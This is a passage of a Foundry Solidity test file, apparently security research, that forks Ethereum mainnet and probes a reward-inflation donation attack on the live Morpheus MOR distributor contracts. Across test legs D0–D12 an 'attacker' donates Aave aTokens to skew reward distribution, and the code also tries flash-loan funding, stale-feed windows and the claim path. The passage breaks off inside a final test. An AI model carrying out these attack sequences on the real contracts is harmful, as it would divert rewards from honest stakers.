// SPDX-License-Identifier: MIT
// MORPHEUS CF-MOR-1 DEEP BATTERY — 2026-11-17 23:07 WIB (perintah user: perdalam CF-MOR-1).
// READ-ONLY vs mainnet: fork lokal saja; tidak ada tx mainnet, tidak ada signing, tidak ada kontak dev.
// Pin blok: 26435255 (pin run 1; run 2 memakai 26435687 — angka run 2 dikutip dengan pin-nya).
// RPC: https://ethereum.publicnode.com
// Kaki: D0 kontrol pin ini; D1-D7 tuning (1b); D8-D9 kaki klaim + stale (1c);
//       D10-D12 varian aneh (1d): flash-loan, sweep publik, pool baru, staker kontrak.
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

interface IERC20M3 {
    function balanceOf(address a) external view returns (uint256);
    function approve(address s, uint256 v) external returns (bool);
    function transfer(address to, uint256 v) external returns (bool);
    function decimals() external view returns (uint8);
}

struct ProtocolDetailsM3 { uint128 withdrawLock; uint128 claimLockAfterStake; uint128 claimLockAfterClaim; uint256 minimalStake; uint256 distributedRewards; }
struct LZConfigM3 { address gateway; address receiver; uint16 receiverChainId; address zroPaymentAddress; bytes adapterParams; }

interface IDepositPoolM3 {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function withdraw(uint256 rewardPoolIndex_, uint256 amount_) external;
    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    function claimFor(uint256 rewardPoolIndex_, address staker_, address receiver_) external payable;
    function rewardPoolsProtocolDetails(uint256 i) external view returns (ProtocolDetailsM3 memory);
    function rewardPoolsData(uint256 i) external view returns (uint128, uint256, uint256);
    function getLatestUserReward(uint256 i, address u) external view returns (uint256);
    function usersData(address u, uint256 i) external view returns (uint128, uint256, uint256, uint256, uint128, uint128, uint256, uint128, address);
}

interface IDistributorM3 {
    function distributeRewards(uint256 i) external;
    function getDistributedRewards(uint256 i, address p) external view returns (uint256);
    function depositPools(uint256 i, address p) external view returns (address, string memory, uint256, uint256, uint256, uint8, address, bool);
    function rewardPoolLastCalculatedTimestamp(uint256 i) external view returns (uint128);
    function withdrawYield(uint256 i, address p) external;
    function sendMintMessage(uint256 i, address u, uint256 amt, address refundTo) external payable;
    function aavePoolAddressesProvider() external view returns (address);
}

interface IRewardPoolM3 {
    function getPeriodRewards(uint256 i, uint128 s, uint128 e) external view returns (uint256);
}

interface IChainLinkM3 {
    function getPathId(string memory p) external pure returns (bytes32);
    function setAllowedPriceUpdateDelay(address feed_, uint64 delay_) external;
}

interface IOwnableM3 { function owner() external view returns (address); }
interface IAavePoolM3 {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes calldata params, uint16 referralCode) external;
}
interface IAaveProviderM3 { function getPool() external view returns (address); }
interface ILZEndpointM3 {
    function quoteFee(uint16 dstChainId_, address userApplication_, bytes calldata payload_, bool payInZRO_, bytes calldata adapterParams_) external view returns (uint256 nativeFee_, uint256 zroFee_);
}

// Flash-loan donor: borrows WBTC, supplies to Aave, donates aWBTC to Distributor,
// triggers distribution, then Aave tries to pull repayment from an empty balance.
contract FlashDonorM3 {
    address public dist;
    address public aavePool;
    address public aToken;
    function setup(address dist_, address aavePool_, address aToken_) external {
        dist = dist_; aavePool = aavePool_; aToken = aToken_;
    }
    function go(address asset, uint256 amount) external {
        IAavePoolM3(aavePool).flashLoanSimple(address(this), asset, amount, "", 0);
    }
    function executeOperation(address asset, uint256 amount, uint256 premium, address, bytes calldata) external returns (bool) {
        require(msg.sender == aavePool, "only aave");
        IERC20M3(asset).approve(aavePool, amount);
        IAavePoolM3(aavePool).supply(asset, amount, address(this), 0);
        uint256 aBal = IERC20M3(aToken).balanceOf(address(this));
        IERC20M3(aToken).transfer(dist, aBal);
        IDistributorM3(dist).distributeRewards(0);
        // Approve the repayment pull (amount + premium). Whether it succeeds
        // depends entirely on this contract holding OTHER WBTC: the donation
        // itself is inside the Distributor and cannot come back.
        IERC20M3(asset).approve(msg.sender, amount + premium);
        return true;
    }
}

// Contract staker: stakes + donates from a contract address (equivalence check vs EOA).
contract ContractStakerM3 {
    function stakeAndDonate(address pool, address dist, address aavePool, address token, address aToken, uint256 stakeAmt, uint256 donateAmt) external {
        IERC20M3(token).approve(dist, stakeAmt);
        IDepositPoolM3(pool).stake(0, stakeAmt, 0, address(0));
        IERC20M3(token).approve(aavePool, donateAmt);
        IAavePoolM3(aavePool).supply(token, donateAmt, address(this), 0);
        uint256 aBal = IERC20M3(aToken).balanceOf(address(this));
        IERC20M3(aToken).transfer(dist, aBal);
    }
}

contract Mor1Deep is Test {
    address constant POOL_STETH = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant POOL_WETH = 0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384;
    address constant POOL_WBTC = 0xdE283F8309Fd1AA46c95d299f6B8310716277A42;
    address constant POOL_USDC = 0x6cCE082851Add4c535352f596662521B4De4750E;
    address constant POOL_USDT = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;
    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant REW = 0xb7994dE339AEe515C9b2792831CD83f3C9D8df87;
    address constant CLDC = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;
    address constant L1S = 0x2Efd4430489e1a05A89c2f51811aC661B7E5FF84;
    address constant LZ_ENDPOINT = 0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 constant FORK_BLOCK = 26435255;
    string constant RPC = "https://ethereum.publicnode.com";

    address attacker;
    address victim;
    address third;

    function setUp() public {
        vm.createSelectFork(vm.envOr("MOR_RPC_URL", RPC), FORK_BLOCK);
        attacker = vm.addr(0xA77A);
        victim = vm.addr(0xBEEF);
        third = vm.addr(0xCAFE);
        deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
        deal(third, 100 ether);
        vm.deal(address(this), 100 ether);
    }

    function _try(address t, bytes memory d) internal returns (bool ok, bytes memory ret) { (ok, ret) = t.call(d); }
    function _tryValue(address t, bytes memory d, uint256 v) internal returns (bool ok, bytes memory ret) { (ok, ret) = t.call{value: v}(d); }
    function _stake(address pool, address user, uint256 amt) internal {
        vm.startPrank(user, user);
        IDepositPoolM3(pool).stake(0, amt, 0, address(0));
        vm.stopPrank();
    }
    function _approveDist(address token, address user) internal {
        vm.startPrank(user, user);
        IERC20M3(token).approve(DIST, type(uint256).max);
        vm.stopPrank();
    }
    function _approveRaw(address token, address user, address spender) internal {
        vm.startPrank(user, user);
        (bool ok, ) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, type(uint256).max));
        require(ok, "raw approve failed");
        vm.stopPrank();
    }
    function _unbrickFeeds() internal {
        address owner_ = IOwnableM3(CLDC).owner();
        address[5] memory pools = [POOL_STETH, POOL_WETH, POOL_WBTC, POOL_USDC, POOL_USDT];
        vm.startPrank(owner_, owner_);
        for (uint i = 0; i < 5; i++) {
            (, string memory path_, , , , , , ) = IDistributorM3(DIST).depositPools(0, pools[i]);
            bytes32 pid = IChainLinkM3(CLDC).getPathId(path_);
            for (uint256 j = 0; j < 4; j++) {
                (bool ok, bytes memory ret) = CLDC.call(abi.encodeWithSignature("dataFeeds(bytes32,uint256)", pid, j));
                if (!ok || ret.length < 32) break;
                IChainLinkM3(CLDC).setAllowedPriceUpdateDelay(abi.decode(ret, (address)), type(uint64).max);
            }
        }
        vm.stopPrank();
    }
    function _aavePool() internal view returns (address) {
        return IAaveProviderM3(IDistributorM3(DIST).aavePoolAddressesProvider()).getPool();
    }
    function _donateFrom(address user, address token, address aToken, uint256 amount) internal returns (uint256 donated) {
        address aavePool = _aavePool();
        _approveRaw(token, user, aavePool);
        vm.startPrank(user, user);
        IAavePoolM3(aavePool).supply(token, amount, user, 0);
        donated = IERC20M3(aToken).balanceOf(user);
        IERC20M3(aToken).transfer(DIST, donated);
        vm.stopPrank();
    }
    function _distributeAs(address who) internal {
        vm.startPrank(who, who);
        IDistributorM3(DIST).distributeRewards(0);
        vm.stopPrank();
    }
    function _poolInfo(address pool) internal view returns (uint256 price, uint256 deposited, uint256 lub, uint8 strat, address aToken) {
        (, , price, deposited, lub, strat, aToken, ) = IDistributorM3(DIST).depositPools(0, pool);
    }
    function _totalVirtual(address pool) internal view returns (uint256 tv) {
        (, , tv) = IDepositPoolM3(pool).rewardPoolsData(0);
    }
    function _lzConfig() internal view returns (LZConfigM3 memory cfg) {
        (bool ok, bytes memory ret) = L1S.staticcall(abi.encodeWithSignature("layerZeroConfig()"));
        require(ok, "lzConfig failed");
        (address g, address r, uint16 cid, address z, bytes memory ap) = abi.decode(ret, (address, address, uint16, address, bytes));
        cfg = LZConfigM3(g, r, cid, z, ap);
    }
    // Generic wBTC scenario: stake stakeSat, warp 1 period, donate donateSat, distribute, log all.
    function _runWBTC(uint256 stakeSat, uint256 donateSat, string memory tag) internal returns (uint256 attackerReward, uint256 delta, uint256 bp) {
        (, , , uint8 strat, address aTok) = _poolInfo(POOL_WBTC);
        require(strat == 2, "wBTC not AAVE");
        deal(WBTC, attacker, 10 * 1e8);
        _approveDist(WBTC, attacker);
        _stake(POOL_WBTC, attacker, stakeSat);
        uint256 distBefore = IDistributorM3(DIST).getDistributedRewards(0, POOL_WBTC);
        uint128 lcBefore = IDistributorM3(DIST).rewardPoolLastCalculatedTimestamp(0);
        _unbrickFeeds();
        vm.warp(block.timestamp + 86401);
        uint256 periodRewards = IRewardPoolM3(REW).getPeriodRewards(0, lcBefore, uint128(block.timestamp));
        uint256 donated = donateSat == 0 ? 0 : _donateFrom(attacker, WBTC, aTok, donateSat);
        _distributeAs(attacker);
        uint256 distAfter = IDistributorM3(DIST).getDistributedRewards(0, POOL_WBTC);
        delta = distAfter - distBefore;
        bp = periodRewards > 0 ? delta * 10000 / periodRewards : 0;
        attackerReward = IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker);
        console.log(tag, "donated sat", donated);
        console.log(tag, "periodRewards", periodRewards);
        console.log(tag, "delta MOR", delta);
        console.log(tag, "delta bp", bp);
        console.log(tag, "attackerReward MOR", attackerReward);
        console.log(tag, "attacker virtual share bp", _totalVirtual(POOL_WBTC) > 0 ? _virtOf(POOL_WBTC, attacker) * 10000 / _totalVirtual(POOL_WBTC) : 0);
    }
    function _virtOf(address pool, address u) internal view returns (uint256 v) {
        (, , , , , , v, , ) = IDepositPoolM3(pool).usersData(u, 0);
    }

    // ---- D0: control at this pin — stake 1 wBTC, NO donation ----
    function testD0_ControlPin() public {
        (, uint256 depW, , , ) = _poolInfo(POOL_WBTC);
        (, uint256 depU, , , ) = _poolInfo(POOL_USDC);
        (, uint256 depT, , , ) = _poolInfo(POOL_USDT);
        console.log("D0 wBTC deposited", depW);
        console.log("D0 USDC deposited", depU);
        console.log("D0 USDT deposited", depT);
        (uint256 rew, uint256 delta, uint256 bp) = _runWBTC2(1e8, 0);
        console.log("D0 control attackerReward", rew);
        console.log("D0 control wBTC delta", delta);
        console.log("D0 control delta bp", bp);
    }
    function _runWBTC2(uint256 stakeSat, uint256 donateSat) internal returns (uint256, uint256, uint256) {
        return _runWBTC(stakeSat, donateSat, "D0");
    }

    // ---- D1: low-end wBTC curve (stake 1 wBTC) ----
    function testD1a_WBTC_00001() public { _runWBTC(1e8, 1e4, "D1a"); }   // 0.0001 wBTC = $6.43 (1/100 of T21)
    function testD1b_WBTC_000025() public { _runWBTC(1e8, 25e3, "D1b"); }  // 0.00025 wBTC = $16.07

    // ---- D2: stake-share curve, donation fixed 0.002 wBTC ($128.57) ----
    function testD2a_Stake0011() public { _runWBTC(11e5, 2e5, "D2a"); }   // stake 0.011 wBTC
    function testD2b_Stake01() public { _runWBTC(1e7, 2e5, "D2b"); }      // stake 0.1 wBTC
    function testD2c_Stake1() public { _runWBTC(1e8, 2e5, "D2c"); }       // stake 1 wBTC (cf. R2B2 @26435687)

    // ---- D3: USDT pool curve ----
    function _runUSDT(uint256 stake6, uint256 donate6, string memory tag) internal {
        (, uint256 dep, , uint8 strat, address aTok) = _poolInfo(POOL_USDT);
        console.log(tag, "USDT deposited pre", dep);
        require(strat == 2, "USDT not AAVE");
        deal(USDT, attacker, 1000000 * 1e6);
        _approveRaw(USDT, attacker, DIST);
        _stake(POOL_USDT, attacker, stake6);
        uint256 distBefore = IDistributorM3(DIST).getDistributedRewards(0, POOL_USDT);
        uint128 lcBefore = IDistributorM3(DIST).rewardPoolLastCalculatedTimestamp(0);
        _unbrickFeeds();
        vm.warp(block.timestamp + 86401);
        uint256 periodRewards = IRewardPoolM3(REW).getPeriodRewards(0, lcBefore, uint128(block.timestamp));
        uint256 donated = _donateFrom(attacker, USDT, aTok, donate6);
        _distributeAs(attacker);
        uint256 distAfter = IDistributorM3(DIST).getDistributedRewards(0, POOL_USDT);
        console.log(tag, "donated aUSDT", donated);
        console.log(tag, "delta MOR", distAfter - distBefore);
        console.log(tag, "delta bp", periodRewards > 0 ? (distAfter - distBefore) * 10000 / periodRewards : 0);
        console.log(tag, "attackerReward MOR", IDepositPoolM3(POOL_USDT).getLatestUserReward(0, attacker));
        console.log(tag, "attacker virtual share bp", _totalVirtual(POOL_USDT) > 0 ? _virtOf(POOL_USDT, attacker) * 10000 / _totalVirtual(POOL_USDT) : 0);
    }
    function testD3a_USDT_Stake5000_Donate10() public { _runUSDT(5000 * 1e6, 10 * 1e6, "D3a"); }
    function testD3b_USDT_Stake5000_Donate100() public { _runUSDT(5000 * 1e6, 100 * 1e6, "D3b"); }

    // ---- D4: repeated small donations, 3 periods, vs single 3x donation ----
    function testD4a_Repeat3x() public {
        (, , , , address aTok) = _poolInfo(POOL_WBTC);
        deal(WBTC, attacker, 10 * 1e8);
        _approveDist(WBTC, attacker);
        _stake(POOL_WBTC, attacker, 1e8);
        _unbrickFeeds();
        uint256 cum0 = IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker);
        console.log("D4a reward start", cum0);
        for (uint256 k = 1; k <= 3; k++) {
            vm.warp(block.timestamp + 86401);
            _donateFrom(attacker, WBTC, aTok, 1e5);
            _distributeAs(attacker);
            console.log("D4a reward after period", k);
            console.log("D4a reward value", IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker));
        }
    }
    function testD4b_Single3x() public { _runWBTC(1e8, 3e5, "D4b"); }

    // ---- D5: cross-pool donation (stake wBTC, donate aUSDC $100) ----
    function testD5_CrossPool() public {
        (, , , , address aTokU) = _poolInfo(POOL_USDC);
        deal(WBTC, attacker, 10 * 1e8);
        deal(USDC, attacker, 1000000 * 1e6);
        _approveDist(WBTC, attacker);
        _stake(POOL_WBTC, attacker, 1e8);
        uint256 distW0 = IDistributorM3(DIST).getDistributedRewards(0, POOL_WBTC);
        uint256 distU0 = IDistributorM3(DIST).getDistributedRewards(0, POOL_USDC);
        _unbrickFeeds();
        vm.warp(block.timestamp + 86401);
        uint256 donated = _donateFrom(attacker, USDC, aTokU, 100 * 1e6);
        _distributeAs(attacker);
        console.log("D5 donated aUSDC", donated);
        console.log("D5 wBTC delta", IDistributorM3(DIST).getDistributedRewards(0, POOL_WBTC) - distW0);
        console.log("D5 USDC delta", IDistributorM3(DIST).getDistributedRewards(0, POOL_USDC) - distU0);
        console.log("D5 attacker wBTC reward", IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker));
        console.log("D5 attacker USDC reward", IDepositPoolM3(POOL_USDC).getLatestUserReward(0, attacker));
    }

    // ---- D6: donate BEFORE stake (ordering) ----
    function testD6_DonateBeforeStake() public {
        (, , , , address aTok) = _poolInfo(POOL_WBTC);
        deal(WBTC, attacker, 10 * 1e8);
        uint256 donated = _donateFrom(attacker, WBTC, aTok, 2e5);
        console.log("D6 donated before stake", donated);
        _approveDist(WBTC, attacker);
        _stake(POOL_WBTC, attacker, 1e8); // stake's internal supply/distribute settles the donation first
        _unbrickFeeds();
        vm.warp(block.timestamp + 86401);
        _distributeAs(attacker);
        console.log("D6 attackerReward (donate-first)", IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker));
        console.log("D6 wBTC distributed total", IDistributorM3(DIST).getDistributedRewards(0, POOL_WBTC));
    }

    // ---- D7: donate, distribute, withdraw all, reward persists ----
    function testD7_WithdrawAfterDonation() public {
        (, , , , address aTok) = _poolInfo(POOL_WBTC);
        deal(WBTC, attacker, 10 * 1e8);
        _approveDist(WBTC, attacker);
        _stake(POOL_WBTC, attacker, 1e8);
        _unbrickFeeds();
        vm.warp(block.timestamp + 86401);
        _donateFrom(attacker, WBTC, aTok, 2e5);
        _distributeAs(attacker);
        uint256 rewBefore = IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker);
        console.log("D7 reward before withdraw", rewBefore);
        vm.warp(block.timestamp + 604801); // withdraw lock 7d
        vm.startPrank(attacker, attacker);
        IDepositPoolM3(POOL_WBTC).withdraw(0, 1e8);
        vm.stopPrank();
        uint256 rewAfter = IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker);
        console.log("D7 reward after full withdraw", rewAfter);
        console.log("D7 attacker WBTC bal after", IERC20M3(WBTC).balanceOf(attacker));
        require(rewAfter >= rewBefore, "D7: reward lost on withdraw");
    }

    // ---- D8: stale-feed accumulation (CF-MOR-CLDC interaction) ----
    function testD8_StaleAccumulates() public {
        (, , , , address aTok) = _poolInfo(POOL_WBTC);
        deal(WBTC, attacker, 10 * 1e8);
        _approveDist(WBTC, attacker);
        _stake(POOL_WBTC, attacker, 1e8);
        uint256 distBefore = IDistributorM3(DIST).getDistributedRewards(0, POOL_WBTC);
        (, , uint256 lubBefore, , ) = _poolInfo(POOL_WBTC);
        // Warp 400 days WITHOUT unbricking: feeds go stale (T10 condition).
        vm.warp(block.timestamp + 400 days);
        uint256 donated = _donateFrom(attacker, WBTC, aTok, 2e5);
        console.log("D8 donated during stale", donated);
        console.log("D8 DIST aWBTC bal", IERC20M3(aTok).balanceOf(DIST));
        console.log("D8 wBTC lub before dist", lubBefore);
        (bool okDist, bytes memory retDist) = _try(DIST, abi.encodeWithSignature("distributeRewards(uint256)", 0));
        console.log("D8 distribute while stale ok?", okDist ? 1 : 0);
        if (!okDist && retDist.length >= 4) console.log("D8 distribute revert sel", uint256(uint32(bytes4(retDist))));
        (bool okStake, ) = _try(POOL_WBTC, abi.encodeWithSignature("stake(uint256,uint256,uint128,address)", 0, 1e6, 0, address(0)));
        console.log("D8 stake while stale ok?", okStake ? 1 : 0);
        // Unbrick -> distribution runs over the whole 400d window; donation inside balance.
        _unbrickFeeds();
        uint128 lc = IDistributorM3(DIST).rewardPoolLastCalculatedTimestamp(0);
        uint256 periodRewards = IRewardPoolM3(REW).getPeriodRewards(0, lc, uint128(block.timestamp));
        _distributeAs(attacker);
        uint256 distAfter = IDistributorM3(DIST).getDistributedRewards(0, POOL_WBTC);
        (, , uint256 lubAfter, , ) = _poolInfo(POOL_WBTC);
        console.log("D8 periodRewards 400d", periodRewards);
        console.log("D8 wBTC delta", distAfter - distBefore);
        console.log("D8 delta bp of period", periodRewards > 0 ? (distAfter - distBefore) * 10000 / periodRewards : 0);
        console.log("D8 lub after == DIST bal?", lubAfter == IERC20M3(aTok).balanceOf(DIST) ? 1 : 0);
        console.log("D8 attackerReward", IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker));
        require(!okDist, "D8: distribute should brick while stale");
        require(distAfter > distBefore, "D8: nothing allocated after unbrick");
    }

    // ---- D9: claim leg end-to-end (fix of R2C1: unbrick AFTER the long warp) ----
    function testD9_ClaimLeg() public {
        (, , , , address aTok) = _poolInfo(POOL_WBTC);
        deal(WBTC, attacker, 10 * 1e8);
        _approveDist(WBTC, attacker);
        uint256 g0 = gasleft();
        _stake(POOL_WBTC, attacker, 1e8);
        console.log("D9 stake gas", g0 - gasleft());
        _unbrickFeeds();
        vm.warp(block.timestamp + 86401);
        _donateFrom(attacker, WBTC, aTok, 1e6);
        _distributeAs(attacker);
        uint256 rew1 = IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker);
        console.log("D9 reward after donation period", rew1);
        // claimFor by stranger (no claimSender set) must revert even with a reward pending.
        (bool okCF, bytes memory retCF) = _tryValue(POOL_WBTC, abi.encodeWithSignature("claimFor(uint256,address,address)", 0, attacker, third), 0.01 ether);
        console.log("D9 claimFor stranger ok?", okCF ? 1 : 0);
        if (!okCF && retCF.length >= 4) console.log("D9 claimFor revert sel", uint256(uint32(bytes4(retCF))));
        // Distributor.sendMintMessage called directly by attacker must revert (only DepositPool).
        (bool okSM, ) = _tryValue(DIST, abi.encodeWithSignature("sendMintMessage(uint256,address,uint256,address)", 0, attacker, 1 ether, attacker), 0.01 ether);
        console.log("D9 direct Distributor.sendMintMessage ok?", okSM ? 1 : 0);
        // Warp past claim locks (14d after stake + 14d after claim), THEN unbrick (R2C1 fix).
        vm.warp(block.timestamp + 28 days + 2);
        _unbrickFeeds();
        // Permissionless trigger: a fresh EOA with no stake settles the period.
        g0 = gasleft();
        _distributeAs(third);
        console.log("D9 distributeRewards by uninvolved EOA gas", g0 - gasleft());
        uint256 rewBeforeClaim = IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker);
        console.log("D9 reward before claim", rewBeforeClaim);
        // LZ fee quote for the exact payload claim() will send.
        LZConfigM3 memory lz = _lzConfig();
        bytes memory payload = abi.encode(attacker, rewBeforeClaim);
        (bool okQ, bytes memory retQ) = LZ_ENDPOINT.staticcall(
            abi.encodeWithSignature("quoteFee(uint16,address,bytes,bool,bytes)", lz.receiverChainId, L1S, payload, false, lz.adapterParams)
        );
        uint256 nativeFee = 0.05 ether;
        console.log("D9 quoteFee ok?", okQ ? 1 : 0);
        if (okQ) {
            (uint256 nf, uint256 zf) = abi.decode(retQ, (uint256, uint256));
            nativeFee = nf;
            console.log("D9 LZ nativeFee wei", nf);
            console.log("D9 LZ zroFee", zf);
        }
        // Claim, recording logs to catch MintMessageSent(user, amount).
        vm.recordLogs();
        g0 = gasleft();
        vm.startPrank(attacker, attacker);
        IDepositPoolM3(POOL_WBTC).claim{value: nativeFee + 0.01 ether}(0, attacker);
        vm.stopPrank();
        console.log("D9 claim gas", g0 - gasleft());
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 mintSig = keccak256("MintMessageSent(address,uint256)");
        uint256 mintAmt = 0;
        address mintUser = address(0);
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics.length > 0 && logs[i].topics[0] == mintSig && logs[i].emitter == L1S) {
                (mintUser, mintAmt) = abi.decode(logs[i].data, (address, uint256));
            }
        }
        console.log("D9 MintMessageSent user is attacker?", mintUser == attacker ? 1 : 0);
        console.log("D9 MintMessageSent amount", mintAmt);
        console.log("D9 reward before claim (again)", rewBeforeClaim);
        uint256 rewAfterClaim = IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker);
        console.log("D9 reward after claim", rewAfterClaim);
        require(mintAmt == rewBeforeClaim && rewBeforeClaim > 0, "D9: mint amount != accounted reward");
        require(rewAfterClaim == 0, "D9: reward not zeroed after claim");
        // Immediate second claim: claim-lock (C) must revert.
        (bool ok2, bytes memory ret2) = _tryValue(POOL_WBTC, abi.encodeWithSignature("claim(uint256,address)", 0, attacker), nativeFee + 0.01 ether);
        console.log("D9 immediate re-claim ok?", ok2 ? 1 : 0);
        if (!ok2 && ret2.length >= 4) console.log("D9 re-claim revert sel", uint256(uint32(bytes4(ret2))));
        require(!okCF && !okSM && !ok2, "D9: a guard failed");
        // After 14d, a third claim succeeds but only for honest accrual (no double-claim of the donated chunk).
        vm.warp(block.timestamp + 14 days + 2);
        _unbrickFeeds();
        uint256 rew3 = IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker);
        console.log("D9 reward 14d after claim (honest accrual only)", rew3);
        require(rew3 < rewBeforeClaim / 10, "D9: third claim window holds too much (double-claim?)");
    }

    // ---- D9b: claim with receiver = third party (event-verified, extends T12) ----
    function testD9b_ClaimReceiverThird() public {
        (, , , , address aTok) = _poolInfo(POOL_WBTC);
        deal(WBTC, attacker, 10 * 1e8);
        _approveDist(WBTC, attacker);
        _stake(POOL_WBTC, attacker, 1e7);
        _unbrickFeeds();
        vm.warp(block.timestamp + 86401);
        _donateFrom(attacker, WBTC, aTok, 2e5);
        _distributeAs(attacker);
        vm.warp(block.timestamp + 28 days + 2);
        _unbrickFeeds();
        _distributeAs(third); // settle pending period first: the view understates claimable until distribution executes
        uint256 rew = IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker);
        console.log("D9b reward", rew);
        vm.recordLogs();
        vm.startPrank(attacker, attacker);
        IDepositPoolM3(POOL_WBTC).claim{value: 0.06 ether}(0, third);
        vm.stopPrank();
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 mintSig = keccak256("MintMessageSent(address,uint256)");
        address mintUser = address(0);
        uint256 mintAmt = 0;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics.length > 0 && logs[i].topics[0] == mintSig && logs[i].emitter == L1S) {
                (mintUser, mintAmt) = abi.decode(logs[i].data, (address, uint256));
            }
        }
        console.log("D9b mint user is third?", mintUser == third ? 1 : 0);
        console.log("D9b mint amount == reward?", mintAmt == rew ? 1 : 0);
        console.log("D9b attacker reward after", IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker));
        require(mintUser == third && mintAmt == rew, "D9b: receiver override mismatch");
    }

    // ---- D10: flash-loan-funded donation cannot be repaid (donation is sunk) ----
    function testD10_FlashLoanDonation() public {
        (, , , , address aTok) = _poolInfo(POOL_WBTC);
        deal(WBTC, attacker, 10 * 1e8);
        _approveDist(WBTC, attacker);
        _stake(POOL_WBTC, attacker, 1e8);
        _unbrickFeeds();
        vm.warp(block.timestamp + 86401);
        FlashDonorM3 fd = new FlashDonorM3();
        fd.setup(DIST, _aavePool(), aTok);
        uint256 distBefore = IDistributorM3(DIST).getDistributedRewards(0, POOL_WBTC);
        (bool ok, bytes memory ret) = _try(address(fd), abi.encodeWithSignature("go(address,uint256)", WBTC, 2e5));
        console.log("D10 flash-loan donate+distribute ok?", ok ? 1 : 0);
        if (!ok && ret.length >= 4) console.log("D10 revert sel", uint256(uint32(bytes4(ret))));
        console.log("D10 distributed unchanged after revert?", IDistributorM3(DIST).getDistributedRewards(0, POOL_WBTC) == distBefore ? 1 : 0);
        console.log("D10 flash contract WBTC bal", IERC20M3(WBTC).balanceOf(address(fd)));
        console.log("D10 flash contract aWBTC bal", IERC20M3(aTok).balanceOf(address(fd)));
        require(!ok, "D10: flash-loan donation unexpectedly repayable");
    }

    // ---- D11: public yield sweep pays l1Sender, never the donor; addDepositPool is owner-only ----
    function testD11_SweepAndPoolGate() public {
        (, , , , address aTok) = _poolInfo(POOL_WBTC);
        deal(WBTC, attacker, 10 * 1e8);
        _approveDist(WBTC, attacker);
        _stake(POOL_WBTC, attacker, 1e8);
        _unbrickFeeds();
        vm.warp(block.timestamp + 86401);
        _donateFrom(attacker, WBTC, aTok, 2e5);
        _distributeAs(attacker);
        uint256 l1sBalBefore = IERC20M3(WBTC).balanceOf(L1S);
        uint256 atkABefore = IERC20M3(aTok).balanceOf(attacker);
        // Anyone may call withdrawYield, but the yield is swept to l1Sender.
        vm.startPrank(third, third);
        IDistributorM3(DIST).withdrawYield(0, POOL_WBTC);
        vm.stopPrank();
        console.log("D11 l1Sender WBTC gained", IERC20M3(WBTC).balanceOf(L1S) - l1sBalBefore);
        console.log("D11 attacker aWBTC unchanged?", IERC20M3(aTok).balanceOf(attacker) == atkABefore ? 1 : 0);
        console.log("D11 third WBTC bal", IERC20M3(WBTC).balanceOf(third));
        // Weird-token pool creation is owner-gated (Zenith M-2 fix isDepositTokenAdded also present).
        (bool okAdd, bytes memory retAdd) = _try(
            DIST,
            abi.encodeWithSignature("addDepositPool(uint256,address,address,string,uint8)", 0, POOL_WBTC, WBTC, "WBTC/USD", 2)
        );
        console.log("D11 addDepositPool by attacker ok?", okAdd ? 1 : 0);
        if (!okAdd && retAdd.length >= 4) console.log("D11 addDepositPool revert sel", uint256(uint32(bytes4(retAdd))));
        require(!okAdd, "D11: addDepositPool not owner-gated");
        require(IERC20M3(WBTC).balanceOf(third) == 0, "D11: sweeper got paid");
    }

    // ---- D12: contract staker equivalence (same params as D2c, via contract) ----
    function testD12_ContractStaker() public {
        (, , , , address aTok) = _poolInfo(POOL_WBTC);
        ContractStakerM3 cs = new ContractStakerM3();
        deal(WBTC, address(cs), 10 * 1e8);
        uint256 distBefore = IDistributorM3(DIST).getDistributedRewards(0, POOL_WBTC);
        cs.stakeAndDonate(POOL_WBTC, DIST, _aavePool(), WBTC, aTok, 1e8, 2e5);
        _unbrickFeeds();
        vm.warp(block.timestamp + 86401);
        _distributeAs(attacker);
        uint256 delta = IDistributorM3(DIST).getDistributedRewards(0, POOL_WBTC) - distBefore;
        uint256 rew = IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, address(cs));
        console.log("D12 contract-staker delta", delta);
        console.log("D12 contract-staker reward", rew);
        console.log("D12 contract virtual share bp", _totalVirtual(POOL_WBTC) > 0 ? _virtOf(POOL_WBTC, address(cs)) * 10000 / _totalVirtual(POOL_WBTC) : 0);
        require(rew > 0, "D12: contract staker got nothing");
    }

    // ---- D9c: net LayerZero fee actually consumed by a claim (balance delta; forge gasPrice = 0) ----
    function testD9c_ClaimNetFee() public {
        (, , , , address aTok) = _poolInfo(POOL_WBTC);
        deal(WBTC, attacker, 10 * 1e8);
        _approveDist(WBTC, attacker);
